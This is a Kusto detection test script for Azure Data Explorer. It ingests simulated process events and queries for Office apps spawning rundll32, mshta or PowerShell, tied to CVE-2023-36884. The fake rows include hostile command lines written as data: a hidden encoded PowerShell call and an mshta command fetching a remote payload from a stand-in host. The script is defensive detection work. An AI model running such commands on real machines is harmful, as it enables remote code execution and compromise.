// ---------------------------
// ThreatChain â€” ADX Test Script
// Purpose: create table, mapping, ingest sample CSV rows inline, run CVE-2023-36884 detection
// Paste all of this into your ADX Kusto query window and run
// ---------------------------

// 1) Create the DeviceProcessEvents table (skip if already exists)
.create table DeviceProcessEvents (
    Timestamp: datetime,
    InitiatingProcessFileName: string,
    FileName: string,
    ProcessCommandLine: string
)

// 2) Inline ingest simulated rows
.ingest inline into table DeviceProcessEvents <|
2025-10-29T16:00:00Z,WINWORD.EXE,rundll32.exe,"rundll32.exe C:\Users\Public\malicious.dll"
2025-10-29T16:01:00Z,EXCEL.EXE,powershell.exe,"powershell -nop -w hidden -enc aQBL..."
2025-10-29T16:02:00Z,OUTLOOK.EXE,mshta.exe,"mshta http://malicious.site/payload.hta"
2025-10-29T16:05:00Z,WINWORD.EXE,notepad.exe,"notepad C:\temp\readme.txt"    // benign row

// 3) Run your ThreatChain detection query
DeviceProcessEvents
| where InitiatingProcessFileName in~ ("WINWORD.EXE", "EXCEL.EXE", "OUTLOOK.EXE")
| where FileName in~ ("rundll32.exe", "mshta.exe", "cmd.exe", "powershell.exe")
| extend CommandLineLower = tolower(ProcessCommandLine)
| where CommandLineLower !contains "office"
| project Timestamp, InitiatingProcessFileName, FileName, ProcessCommandLine
| order by Timestamp desc
